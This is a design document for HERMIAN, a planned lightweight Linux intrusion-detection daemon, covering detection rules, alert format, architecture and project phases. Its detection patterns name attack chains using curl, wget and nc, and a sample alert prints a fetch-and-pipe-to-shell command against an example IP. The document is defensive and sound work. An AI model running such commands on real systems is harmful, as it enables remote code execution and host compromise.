# HERMIAN

**Silent by default. Loud when it matters.**

HERMIAN is a lightweight defensive security daemon for Linux systems (and eventually Windows and macOS) that detects high-confidence signs of compromise and alerts — without requiring a dashboard, a SOC, or constant attention.

---

## Table of Contents

1. [Why HERMIAN](#1-why-hermian)
2. [Project scope](#2-project-scope)
3. [Goals](#3-goals)
4. [Non-goals](#4-non-goals)
5. [Competitive positioning](#5-competitive-positioning)
6. [Detection philosophy](#6-detection-philosophy)
7. [Detection catalog — MVP](#7-detection-catalog--mvp)
8. [Detection hard problems](#8-detection-hard-problems)
9. [Alert format](#9-alert-format)
10. [Alert severity](#10-alert-severity)
11. [False-positive discipline](#11-false-positive-discipline)
12. [Core architecture](#12-core-architecture)
13. [Agent architecture — Linux](#13-agent-architecture--linux)
14. [Container and namespace awareness](#14-container-and-namespace-awareness)
15. [HERMIAN self-protection](#15-hermian-self-protection)
16. [Notifications](#16-notifications)
17. [Response model](#17-response-model)
18. [Security principles](#18-security-principles)
19. [Installation](#19-installation)
20. [Project phases](#20-project-phases)
21. [KPIs and benchmark methodology](#21-kpis-and-benchmark-methodology)
22. [MVP success criteria](#22-mvp-success-criteria)
23. [Way of work](#23-way-of-work)
24. [Long-term vision](#24-long-term-vision)

---

## 1. Why HERMIAN

The existing landscape covers the problem — but not for the target user.

**Falco** is powerful but requires kernel module or eBPF privileges, YAML rule authoring, and sustained operational attention. Deployment on a single developer server is non-trivial.

**Wazuh / OSSEC** is feature-rich but heavy: it expects centralized infrastructure, a dedicated management server, and continuous tuning. RAM and disk consumption are significant.

**osquery** is a query engine, not a detection daemon. It gives you telemetry but not decisions.

**Commercial EDR** is priced for enterprises and often requires a cloud backend, an agent deployment system, and a human reviewing a dashboard.

HERMIAN targets a different user:

- A developer with one or two internet-facing servers.
- A sysadmin managing a small fleet without a SOC.
- A security-conscious user on a personal Linux machine.
- A small team that wants a lightweight additional detection layer.

The target state is:

```
install → enable → forget → get notified only when it matters
```

No YAML rules. No dashboard. No alert fatigue.

---

## 2. Project scope

**Current scope:** Linux only.

Windows and macOS are planned but explicitly post-MVP. No architecture decisions for those platforms will be made until the Linux agent is validated in production workloads.

Expanding scope prematurely is how tools become mediocre everywhere instead of good somewhere.

---

## 3. Goals

### G1 — Frictionless, secure deployment

A user should be able to install HERMIAN in under 3 minutes.

**Target installation flow:**

```bash
# Verify the release before doing anything (Sigstore, keyless)
cosign verify-blob SHA256SUMS --bundle SHA256SUMS.sigstore \
  --certificate-identity-regexp '^https://github.com/hermian-security/hermian/' \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com
sha256sum -c SHA256SUMS --ignore-missing

# Or via system package manager (preferred)
sudo apt install hermian        # Debian/Ubuntu
sudo dnf install hermian        # Fedora/RHEL
sudo pacman -S hermian          # Arch

# Enable
sudo hermian enable
```

> **Note on `curl | sudo sh`:** This pattern is explicitly banned for HERMIAN.  
> Piping an unverified remote script directly to root is the exact behavior HERMIAN exists to detect.  
> The installer must be signed, verifiable, and distributed through package managers or with explicit checksum/GPG verification steps.

After installation, core detections must be active within 60 seconds with no configuration required.

### G2 — Detect high-confidence compromise signals

Focus on behaviors that are genuinely difficult to explain as normal activity in context.

See [Section 7 — Detection catalog](#7-detection-catalog--mvp) for MVP detections.

### G3 — Extremely low operational overhead

Resource targets (see [Section 21](#21-kpis-and-benchmark-methodology) for benchmark methodology):

- `< 1%` average CPU on idle and normal workloads
- `< 80 MB RSS` steady-state
- `< 5s` detection-to-notification latency for HIGH/CRITICAL events

### G4 — Explain every alert

An alert must answer:

- What happened?
- Why does HERMIAN consider this suspicious?
- What triggered it?
- What should the user do?

No opaque scores. No unexplained severity. See [Section 9 — Alert format](#9-alert-format).

---

## 4. Non-goals

HERMIAN must not become:

- A SIEM or centralized log collector
- A full EDR replacement
- A vulnerability management platform
- A packet capture / DPI platform
- A malware sandbox
- A compliance platform
- A dashboard requiring continuous monitoring
- An ML product marketed as intelligent without measurable benefit
- A collection of hundreds of low-confidence detections

If a proposed feature does not directly improve detection, explanation, or safe response — it is deferred.

---

## 5. Competitive positioning

| Tool | Strength | Why HERMIAN is different |
|---|---|---|
| Falco | Powerful eBPF/kernel rules | Requires rule authoring, infra overhead |
| Wazuh | Feature-complete | Heavy, centralized, requires tuning |
| osquery | Flexible telemetry | Query engine, not a detection daemon |
| auditd | Native kernel audit | Noisy, requires expert configuration |
| HERMIAN | Opinionated defaults, local detection, zero dashboard | Targeted at the non-SOC user |

HERMIAN does not try to beat these tools on features. It tries to beat them on time-to-useful-protection for a single host.

---

## 6. Detection philosophy

### Deterministic, contextual detection first

HERMIAN uses rule-based detection grounded in context — not volume-based correlation or black-box scoring.

A detection combines multiple contextual signals:

```
parent process
+ child process
+ user
+ command arguments
+ execution path
+ privilege level
+ system role
+ timing relative to other events
```

### On statistics

Behavioral baselines using simple statistics (moving averages, per-source thresholds, login frequency) are acceptable where they improve signal quality. This is distinct from "ML" in the marketing sense.

Example of acceptable use: flagging an SSH source that has never authenticated to this host before, combined with a root login. This is a threshold + novelty check — not a model.

Opaque model-driven scoring with no interpretable reason is not acceptable.

### Context determines signal value

The same event can be noise or a strong signal depending on context:

| Event | Context | Signal |
|---|---|---|
| `bash` spawned by `sshd` | Interactive SSH session | Ignore |
| `bash` spawned by `nginx` | Production web server | HIGH |
| `bash` spawned by `nginx` → `curl` → exec in `/tmp` | Production web server | CRITICAL |
| `cron` job added | Admin running `crontab -e` | INFO |
| `cron` job added | No active session, file written directly | HIGH |

---

## 7. Detection catalog — MVP

MVP covers exactly **5 detection groups**. Each must achieve the [false-positive targets](#11-false-positive-discipline) before being shipped.

### D1 — Suspicious process chains

Detect process parent/child relationships that are anomalous in context.

**Strong signals:**

```
web-server-process → sh/bash → (curl/wget/python/perl/ruby) → exec
database-process → sh/bash
any-process → exec from /tmp /dev/shm /var/tmp
any-process → exec from deleted inode
```

**Weaker signals (INFO only unless chained):**

```
shell → script → exec (depends on parent and user)
package-manager → network connection (rare, flag for review)
```

**Implementation:** `/proc` monitoring + eBPF `exec` tracepoints (via `aya-rs`).

**False-positive risk:** CI/CD pipelines, build systems, package post-install scripts. Requires a configurable allowlist at the process-chain level.

---

### D2 — SSH and authentication abuse

**Signals:**

- Root SSH login (unless explicitly permitted in config)
- New `authorized_keys` entry added while no active user session owns the file
- SSH config modification (`/etc/ssh/sshd_config`, `~/.ssh/config`)
- Failed authentication burst: N failures from same source within T seconds (configurable threshold)
- Successful authentication from a source that has never authenticated before combined with unusual timing (off-hours, root, or first-time source)
- New system account created or existing account added to sudo/wheel/admin

**Implementation:** PAM hooks + `/proc` + inotify on SSH key files and config.

**False-positive risk:** Automated deployments (Ansible, Terraform) adding keys, legitimate new SSH sources. Requires per-host baseline period for "known sources."

---

### D3 — Persistence modification

**Signals — Linux:**

| Location | Event | Severity |
|---|---|---|
| `/etc/cron*`, `/var/spool/cron/*` | New entry, no associated interactive session | HIGH |
| `~/.bashrc`, `~/.profile`, `/etc/profile.d/*` | Modified, no associated interactive session | HIGH |
| `/etc/systemd/system/*` | New unit file created | HIGH |
| `systemd` service enabled | New service not in package database | HIGH |
| `/etc/ld.so.preload` | Any modification | CRITICAL |
| `/etc/ld.so.conf.d/*` | New entry pointing to non-standard path | HIGH |
| `authorized_keys` | Added entry (any conditions) | HIGH |

**Implementation:** inotify + `/proc` correlation to associate file writes with processes.

**False-positive risk:** Package managers, CM tools (Ansible, Puppet, Chef). The "no associated interactive session" heuristic handles most of this; CM tool processes should be in the allowlist.

---

### D4 — Privilege escalation indicators

**Signals:**

- SUID/SGID binary created in non-standard locations
- `ptrace` call by a non-debugger process on an unrelated process
- `LD_PRELOAD` set in environment of an exec call
- Capabilities granted to a process or binary unexpectedly
- `/etc/sudoers` or `/etc/sudoers.d/*` modified
- `/etc/passwd` or `/etc/shadow` modified outside of `useradd`/`passwd`/`usermod`

**Implementation:** eBPF `syscall` tracepoints for `ptrace`, `execve` environment inspection, inotify for config files.

**False-positive risk:** Debuggers (gdb, strace), container runtimes. These must be in the allowlist or context-filtered.

---

### D5 — Anomalous network behavior in context

**Scope:** Not full packet capture. Only connection metadata correlated with process context.

**Signals:**

- New outbound connection from a process that has never made outbound connections before, combined with another compromise indicator
- Outbound connection from a process chain flagged in D1
- Unexpected listener on a new port (short-lived or otherwise)
- Connection to a new external destination from a web server process

**Implementation:** eBPF socket tracepoints + netlink. No DPI.

**Note:** Standalone network events are LOW or INFO. They become HIGH/CRITICAL only when correlated with D1–D4.

---

## 8. Detection hard problems

These are explicitly acknowledged as hard. MVP does not claim to solve them. They are documented to avoid overconfidence.

### LOLBins (Living off the Land)

An attacker using `python3`, `curl`, `wget`, `openssl`, `nc`, or other legitimate system binaries leaves no anomalous process name. Detection requires:

- Behavioral context (what's the parent, what's the destination)
- Argument inspection
- Baseline deviation

HERMIAN D1 partially addresses this through parent context. Full LOLBin coverage requires behavioral baselines — planned for post-MVP.

### Process injection / fileless execution

No child process is created. Attacks via `ptrace`, `memfd_create`, `/proc/PID/mem` writes, or shared library injection leave no `execve` call. Detection requires eBPF syscall monitoring at a level beyond D1.

D4 partially addresses `ptrace`. Full coverage is a post-MVP detection class.

### Container environments

`/proc` namespace isolation, overlayfs, and cgroup-based process trees can break assumptions HERMIAN makes about parent/child relationships and system role inference. See [Section 14](#14-container-and-namespace-awareness).

### Attacker targeting HERMIAN itself

See [Section 15](#15-hermian-self-protection).

### Advanced lateral movement

SMB, RPC, and credential reuse do not generate suspicious process chains on the *source* host. Detection requires correlation across hosts — a Phase 6 capability.

---

## 9. Alert format

Every alert must be human-readable with no prior security training required.

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🚨 HERMIAN — CRITICAL

Host:      web-prod-01
Time:      2025-09-14 03:17:42 UTC
Detection: D1 — Suspicious process chain

What happened:
  A web server process spawned a shell, which downloaded
  and executed content from a remote host.

Process chain:
  nginx (www-data, PID 1842)
    └── bash (www-data, PID 3107)
         └── curl https://198.51.100.42/x.sh | sh

Why this matters:
  Web servers do not normally spawn interactive shells.
  This chain is consistent with remote code execution via
  a web application vulnerability.

Recommended action:
  1. Isolate this host from the network if the activity
     is unexpected.
  2. Review nginx access logs around 03:17 UTC.
  3. Identify what triggered the request to
     /x.sh on 198.51.100.42.

HERMIAN ref: HER-2025-0914-001
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

**Rules:**

- No unexplained scores.
- Every alert names the detection rule that triggered it.
- Every HIGH/CRITICAL alert includes a recommended action.
- The "why this matters" section must be written in plain language.

---

## 10. Alert severity

| Level | Meaning | Default action |
|---|---|---|
| INFO | Potentially useful context, not immediately actionable | Log only |
| LOW | Suspicious, warrants later review | Log, optional notification |
| HIGH | Strong indication of malicious or unauthorized activity | Notify |
| CRITICAL | High-confidence compromise or dangerous persistence/privilege change | Notify immediately, optional response |

**What severity is not:**

- A confidence score
- A risk rating
- A CVSS-like composite

Severity maps directly to: *what should the user do right now?*

---

## 11. False-positive discipline

This is the primary product problem. A tool that cries wolf is worse than no tool — it trains users to ignore alerts.

### Target

```
< 1 false HIGH or CRITICAL alert per host per month
```

This must be measured against realistic workloads, not idle VMs.

### Testing methodology

Every detection in [Section 7](#7-detection-catalog--mvp) must pass a false-positive test suite before release:

**Test environments:**

- Idle server (no active user, only cron and system services)
- Active web server (nginx/Apache + PHP/Python app under load)
- Active developer workstation (compilation, Docker, package installs)
- SSH-active server (multiple users, Ansible runs, file transfers)
- CI/CD host (automated test runners, build pipelines)

**For each environment, verify:**

1. HERMIAN generates zero HIGH/CRITICAL alerts during 72 hours of normal operation.
2. A simulated attack scenario in the same environment generates a HIGH/CRITICAL alert within 5 seconds.

### Allowlist system

Every detection must support a structured allowlist:

```toml
[allowlist]
# Suppress D1 alerts for this specific chain
[[allowlist.process_chain]]
parent = "deploy-agent"
child  = "bash"
user   = "deploy"
reason = "CI/CD deployment pipeline"

# Suppress D3 alerts for this cron path
[[allowlist.persistence]]
path   = "/var/spool/cron/crontabs/deploy"
reason = "Managed by Ansible"
```

Allowlist entries require a `reason` field. This is non-optional — it creates an audit trail of suppression decisions.

### Baseline period

On first install, HERMIAN enters a 24-hour observation period for D2 (SSH sources) during which it learns the set of known-good SSH sources. After the baseline period, novel sources trigger alerts. This is not ML — it is a set membership check with a TTL.

The baseline period can be skipped with `--no-baseline` for fresh servers.

---

## 12. Core architecture

```
                         HERMIAN
                            │
                     Linux Agent (MVP)
                            │
              ┌─────────────┼─────────────┐
              │             │             │
           eBPF          /proc         inotify
         tracepoints    polling       watchers
              │             │             │
              └─────────────┼─────────────┘
                            │
                    Event normalization
                            │
                   Context enrichment
                   (user, path, chain)
                            │
                    Detection engine
                            │
              ┌─────────────┴─────────────┐
              │                           │
         No match                    Rule match
              │                           │
           Discard               Severity assessment
                                          │
                          ┌───────────────┼───────────┐
                          │               │           │
                        INFO             LOW       HIGH/CRITICAL
                          │               │           │
                        Log           Log +       Log + notify
                                    optional      + optional
                                    notify        response
```

**Local-first.** No event is sent to a remote backend for a detection decision. The agent decides locally.

The backend (when configured) receives alert notifications only — not raw event streams.

---

## 13. Agent architecture — Linux

### Language

**Rust.**

Rationale:
- Memory safety is non-negotiable for a root-privileged daemon.
- `aya-rs` provides a production-ready eBPF toolkit in Rust with no C dependency requirement at compile time.
- Single static binary, minimal deployment surface.
- Performance predictability matters for the CPU overhead target.

Go was considered. Go's eBPF ecosystem (`cilium/ebpf`) is mature, but Go's garbage collector introduces latency unpredictability and memory overhead that conflicts with the resource targets. For a daemon that processes events continuously, Rust is the correct choice here.

### Data sources

| Source | Used for | Mechanism |
|---|---|---|
| eBPF `execve` tracepoint | Process creation chains | `aya-rs` |
| eBPF `sys_enter_connect` | Outbound connection tracking | `aya-rs` |
| eBPF `sys_enter_ptrace` | Ptrace detection | `aya-rs` |
| `/proc/<pid>/stat` | Process metadata enrichment | Polling |
| `/proc/<pid>/cmdline` | Argument inspection | Polling |
| `/proc/<pid>/status` | UID/GID, capability sets | Polling |
| inotify | Persistence paths, SSH config, sudoers | `libc`/`nix` |
| PAM (optional module) | Authentication events | PAM hook |
| `netlink` AUDIT | Fallback where eBPF unavailable | Kernel audit |

**eBPF is a tool, not a requirement.** Where a reliable, cheaper signal exists (inotify for file changes, `/proc` for process metadata), it is preferred. eBPF is used where it provides unique visibility (syscall-level events, cross-process tracking) that cannot be reliably obtained otherwise.

**Minimum kernel version for full eBPF capability:** 5.8  
**Graceful degradation:** on kernels < 5.8, HERMIAN falls back to `/proc` polling and netlink audit for events it cannot obtain via eBPF. Reduced coverage is logged and surfaced in `hermian status`.

---

## 14. Container and namespace awareness

Container environments break several assumptions that host-based detection relies on:

| Assumption | Breaks when |
|---|---|
| PID 1 is init/systemd | Container PID namespacing |
| `/proc/<pid>/exe` is meaningful | Overlayfs, deleted-after-exec binaries |
| Parent PID chain is stable | `docker run` wraps everything under containerd |
| Network connections come from the process | Container network namespacing |

**HERMIAN MVP requirements for container awareness:**

1. Detect when a PID is inside a container namespace via `/proc/<pid>/cgroup` and `/proc/<pid>/ns/pid`.
2. Tag all events with `container: true/false` and, where detectable, `container_id`.
3. Do not fire D3 (persistence) alerts for paths inside container overlayfs layers — these are not host persistence.
4. Apply separate process chain rules for container-spawned processes to reduce false positives from container entrypoints.

Full container-native detection (Kubernetes admission, container runtime integration) is a post-MVP capability.

---

## 15. HERMIAN self-protection

HERMIAN runs with elevated privileges and has network access. It is a high-value target. An attacker who compromises or disables HERMIAN gains silent operation.

### Requirements

**Configuration integrity:**
- HERMIAN configuration is hashed on startup.
- Any modification to the config file while the daemon is running triggers a CRITICAL alert and config reload.
- Configuration is stored with `600` permissions, owned by root.

**Binary integrity:**
- On startup, HERMIAN verifies its own binary against a stored hash.
- Unexpected binary modification triggers an alert before continuing.

**Process protection:**
- HERMIAN monitors for unexpected signals to its own PID.
- HERMIAN does not exclude itself from its own detection — if HERMIAN is used as a persistence mechanism, that should be detectable.

**Anti-tampering:**
- The HERMIAN systemd unit uses `ProtectSystem=strict`, `PrivateTmp=true`, `NoNewPrivileges=true` where compatible with required capabilities.
- Capabilities are scoped minimally: `CAP_SYS_ADMIN` for eBPF, `CAP_NET_ADMIN` only if network isolation response is enabled.

**Secure update:**
- Updates are delivered via signed packages or a signed binary with GPG/sigstore verification.
- No auto-update without explicit user opt-in.
- Update channel is configurable (stable/beta).

**Uninstall:**
- `sudo hermian uninstall` cleanly removes the daemon, systemd unit, config, and log files.
- The uninstall process must not leave privileged orphan processes.

---

## 16. Notifications

HERMIAN must work for months without a user opening a browser. The notification is the product.

**Supported channels (Phase 4):**

| Channel | Priority |
|---|---|
| Local terminal / journald | Phase 1 (MVP) |
| Email (SMTP) | Phase 4 |
| Telegram | Phase 4 |
| Slack webhook | Phase 4 |
| Generic webhook | Phase 4 |
| Optional web console | Phase 6 |

**Delivery guarantees:**

- Notifications are queued locally with retry on failure.
- Delivery failures are logged and surfaced in `hermian status`.
- A notification that fails to deliver for > 15 minutes generates a local CRITICAL log entry.

**Alert deduplication:**

- Repeated identical events within a configurable window (default: 5 minutes) are grouped into a single notification.
- The notification reports: "This pattern repeated N times in the last 5 minutes."

---

## 17. Response model

HERMIAN is **passive by default.**

| Action | Default | Requires explicit enable |
|---|---|---|
| Log event | Always on | — |
| Notify | On for HIGH/CRITICAL | — |
| Collect additional context | Manual via `hermian collect <ref>` | — |
| Block specific connection | Off | Yes |
| Isolate host | Off | Yes |

**Host isolation:**

When enabled, isolation:
- Uses `nftables`/`iptables` rules to block all inbound/outbound except the configured management interface and port.
- Preserves a recovery path: the management SSH source is always exempted.
- Is reversible: `sudo hermian unisolate`.
- Is never triggered automatically on CRITICAL without `--auto-isolate` being explicitly set in config.

**HERMIAN never performs destructive remediation automatically.**

A wrong isolation that locks an admin out of production is an unacceptable outcome. Every active response requires either manual invocation or explicit, documented opt-in.

---

## 18. Security principles

| Principle | Implementation |
|---|---|
| Minimal privileges | Drop capabilities not required at runtime |
| Secure update | Signed packages, GPG/sigstore, no silent auto-update |
| Signed binaries | All release artifacts signed, signatures published |
| Config integrity | Hash on startup, monitor for modification |
| Binary integrity | Hash on startup |
| Auth for control ops | `hermian` CLI requires root or `hermian` group membership |
| Minimal attack surface | No network listener by default; agent connects out only |
| Fail-safe | On internal error, log and alert but do not crash silently |
| Clean uninstall | Full removal path, no orphaned privileged processes |
| No unnecessary secrets | HERMIAN does not read, store, or transmit passwords, API keys, or session tokens |
| No production config changes | HERMIAN never modifies the system configuration it monitors |

---

## 19. Installation

### Target experience

```bash
# Via package manager (preferred)
sudo apt install hermian

# Enable and start
sudo hermian enable

# Check status
sudo hermian status
```

Expected output of `hermian status`:

```
HERMIAN v1.0.0 — active

Host:            web-prod-01
Uptime:          3d 14h 22m
Kernel:          6.1.0 (eBPF full)
Baseline period: complete

Protection status:
  Process chains ............. active (eBPF)
  SSH / auth ................. active (PAM + inotify)
  Persistence ................ active (inotify)
  Privilege escalation ....... active (eBPF)
  Network correlation ........ active (eBPF)

Overhead (last 1h):
  CPU avg .................... 0.3%
  RSS ........................ 47 MB
  Events processed ........... 14,203
  Alerts generated ........... 0

Notifications:
  Channel .................... Telegram
  Last delivery .............. 3d ago (test alert on install)
  Failures ................... 0
```

### Package distribution

- Primary: `.deb` (Debian/Ubuntu), `.rpm` (Fedora/RHEL/CentOS), `PKGBUILD` (Arch AUR)
- Secondary: signed tarball with manual install script
- All packages and binaries signed with a published GPG key
- Key fingerprint published on the project website, GitHub, and a Sigstore transparency log

---

## 20. Project phases

### Phase 0 — Detection research (current)

**Goal:** Validate the MVP detection set before writing a line of daemon code.

**Output:**

- Detection catalog with false-positive risk assessment (this document, Section 7–8)
- Test scenario suite for each detection
- Benchmark baseline for target hardware
- Data source feasibility for each detection on Linux 5.x and 6.x

**Constraint:** No production code. No UI. No cloud.

---

### Phase 1 — Linux MVP

**Implement:**

- Rust daemon with eBPF (aya-rs)
- D1–D5 detections
- Local alert engine with journald output
- CLI (`hermian enable`, `hermian status`, `hermian test`, `hermian collect`)
- Configuration with sane defaults + allowlist support
- Baseline period for SSH sources
- Signed package for Debian/Ubuntu

**Target:** `install → enable → forget`

---

### Phase 2 — Real-world validation

**Test against:**

- Idle server
- Active web server (nginx, Apache)
- Developer workstation (build tools, Docker, IDE)
- SSH-active server
- CI/CD host
- Containerized workload host
- Homelabs

**Simulate:**

- Webshell RCE chain
- SSH key injection
- Cron persistence
- LD_PRELOAD injection
- Systemd service persistence
- Brute-force + credential success
- Fileless exec via `memfd_create`

**Measure CPU, RAM, event volume, false positives, detection latency for each scenario.**

Validation is gated — Phase 3 does not start until:
- All 5 detection groups pass the false-positive test suite
- CPU < 1% and RSS < 80 MB on all test environments
- All HIGH/CRITICAL simulated attacks detected within 5 seconds

---

### Phase 3 — RPM packaging and additional distros

- `.rpm` package for Fedora/RHEL
- `PKGBUILD` for Arch
- Signed binary tarball for distro-agnostic install
- Test on Linux 5.4 LTS (minimum supported kernel)

---

### Phase 4 — Notification ecosystem

- Email (SMTP)
- Telegram bot
- Slack webhook
- Generic webhook
- Alert deduplication
- Notification queue with retry

---

### Phase 5 — Windows

Add Windows agent. Maintain the same user experience.

Detection priority:

- Authentication events (Windows Security Log)
- PowerShell execution monitoring (ETW / Script Block Logging)
- Suspicious process chains
- Scheduled Task persistence
- Service persistence
- Registry Run key persistence
- WMI persistence
- RDP-related security changes
- Local administrator changes

No kernel driver unless a concrete detection requirement cannot be satisfied otherwise.

---

### Phase 6 — Optional central management

Only after the standalone agent is validated in production.

- Fleet status overview
- Centralized alert history
- Multi-host correlation (lateral movement signals)
- Central policy distribution
- Asset inventory

This is an extension. The standalone agent must work without it.

---

### Phase 7 — macOS

- EndpointSecurity API (system extension, no deprecated kexts)
- Focus: LaunchAgents/Daemons, SSH key injection, process chains, auth events

---

## 21. KPIs and benchmark methodology

### Benchmark environments

| Label | Spec | Workload |
|---|---|---|
| `server-idle` | 2 vCPU, 2 GB RAM (t3.small equivalent) | Systemd, cron, sshd — no active users |
| `server-web` | 2 vCPU, 4 GB RAM | nginx + PHP-FPM, 100 req/s via wrk |
| `server-ci` | 4 vCPU, 8 GB RAM | GitHub Actions runner, parallel builds |
| `workstation` | 4 vCPU, 8 GB RAM | VSCode, Docker, terminal, browser |

All benchmarks run for **72 hours** minimum. CPU and RSS are sampled every 30 seconds. p99 values are reported alongside averages.

### Performance KPIs

| KPI | Target | Measurement |
|---|---|---|
| CPU average | < 1% | `ps` / cgroup cpu.stat over 72h |
| CPU p99 spike | < 5% | Captured per 30s sample |
| RSS steady-state | < 80 MB | `smaps_rollup` |
| Detection latency (HIGH/CRITICAL) | < 5s | Time from execve to notification delivery |
| Event throughput | Process > 10,000 events/s without dropped events | Synthetic load test |

### Detection KPIs

| KPI | Target |
|---|---|
| False HIGH/CRITICAL rate | < 1 per host per month on realistic workloads |
| Detection rate — simulated attack scenarios | > 95% |
| Missed detections | Tracked per scenario, published |
| Detection latency — HIGH/CRITICAL | < 5s median, < 10s p99 |

### Reliability KPIs

| KPI | Target |
|---|---|
| Agent uptime | > 99.9% (< 9h downtime/year) |
| Notification delivery success | > 99% (with retry) |
| Crash-free rate | 100% (panics are bugs, not expected) |

### Anti-vanity rule

Event collection volume is **not a KPI.** The number of events processed is an operational metric, not a product success metric.

---

## 22. MVP success criteria

HERMIAN MVP is complete when all of the following are true:

**For a non-security user:**

```
Install in < 3 minutes
  ↓
Run normally for 72 hours — zero false HIGH/CRITICAL alerts
  ↓
Simulate webshell RCE (nginx → bash → curl | sh)
  ↓
CRITICAL alert delivered in < 5 seconds
  ↓
Alert is self-explanatory with no prior security knowledge
```

**For a sysadmin:**

- Deploys to a production server without modifying system configuration
- Generates zero alerts during normal Ansible runs (with appropriate allowlist)
- CPU overhead invisible under production load
- Can be fully uninstalled with one command

**For the project:**

- All 5 detection groups pass false-positive test suite
- CPU and memory targets met on all benchmark environments
- Binary signed, reproducible build documented
- Uninstall path tested and verified

---

## 23. Way of work

### Rule 1 — Build the smallest useful thing

Before adding any feature, ask:

> Does this directly improve detection quality, alert clarity, or safe response capability?

If not, it is deferred.

### Rule 2 — No technology without a measurable problem

Do not introduce Kafka, Kubernetes, graph databases, ML pipelines, or microservices without a benchmark that shows the simpler approach fails to meet a specific requirement.

### Rule 3 — Measure before shipping a detection

Every detection needs:
- A true-positive test case (simulated attack)
- A false-positive test suite (realistic normal workloads)
- CPU and RAM impact measured

A detection that fails the false-positive suite is not shipped.

### Rule 4 — Quality over quantity

10 detections with < 1 false positive/month is more valuable than 500 detections reviewed by nobody because the noise is unbearable.

### Rule 5 — Normal administration is not an attack

Every detection must be tested against:
- Developers using SSH interactively
- Admins running Ansible/Puppet/Chef
- Package manager operations
- CI/CD pipelines
- Backup jobs
- Monitoring agents

### Rule 6 — Active response must survive being wrong

Before shipping any active response capability, answer:

> What happens if HERMIAN fires this incorrectly on a production system?

If the answer is unacceptable, the response is advisory-only until the false-positive rate is demonstrated to justify it.

### Rule 7 — The terminal output is the product

The first successful user experience is:

```
$ sudo hermian status

HERMIAN active. No alerts. Your system is being monitored.
```

Not a web application.

---

## 24. Long-term vision

HERMIAN evolves from a host security daemon into a quiet defensive layer for infrastructure.

The principle does not change:

> Observe less.  
> Understand more.  
> Alert rarely.  
> Explain clearly.  
> Act safely.

The product becomes more capable without becoming more complicated for the person using it.

---

## One-sentence definition

HERMIAN is a lightweight Linux security daemon that detects high-confidence signs of compromise using deterministic, contextual detection and only interrupts the operator when something genuinely requires attention.
